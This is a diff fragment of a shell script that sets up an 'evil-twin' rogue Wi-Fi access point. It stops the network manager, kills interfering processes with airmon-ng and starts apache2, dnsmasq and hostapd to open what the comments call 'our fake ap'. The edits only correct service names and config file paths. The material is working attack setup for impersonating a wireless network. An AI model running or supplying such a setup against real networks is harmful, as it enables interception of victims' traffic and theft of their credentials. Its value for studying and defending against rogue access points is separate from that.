@@ -7,7 +7,7 @@ service apache2 start
 
 
 #stop your network-manager!!!
-service network-manager stop
+service NetworkManager stop
 
 #kill all process 
 airmon-ng check kill
@@ -29,9 +29,9 @@ route -n
 
 
 #add dnsmasq
-dnsmasq -C /root/Desktop/evil-twin/our/dnsmasq-and-hostapd/dnsmask.conf
+dnsmasq -C /root/Desktop/evil-twin/dnsmasq-and-hostapd/dnsmasq.conf
 
 #open our fake ap
-hostapd /root/Desktop/evil-twin/our/dnsmasq-and-hostapd/hostapd.conf
+hostapd /root/Desktop/evil-twin/dnsmasq-and-hostapd/hostapd.conf
 
 
